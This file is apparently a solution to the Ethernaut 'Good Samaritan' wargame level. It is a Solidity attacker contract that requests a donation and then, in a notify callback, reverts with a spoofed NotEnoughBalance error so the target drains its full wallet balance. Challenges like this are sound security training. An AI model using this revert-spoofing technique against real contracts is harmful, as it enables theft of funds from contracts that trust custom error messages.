// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./GoodSamaritan.sol";

contract ErrorInjection is INotifyable {

    GoodSamaritan goodSamaritan;
    Coin coin;
    Wallet wallet;

    error NotEnoughBalance();

    constructor(address $your_ethernaut_instance_here) {
        goodSamaritan = GoodSamaritan($your_ethernaut_instance_here);
        coin = Coin(goodSamaritan.coin());
        wallet = Wallet(goodSamaritan.wallet());
    }

    function inject() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint amount) external {
        if (amount == 10) { 
            revert NotEnoughBalance(); 
        } else {
            return;
        }
    }
}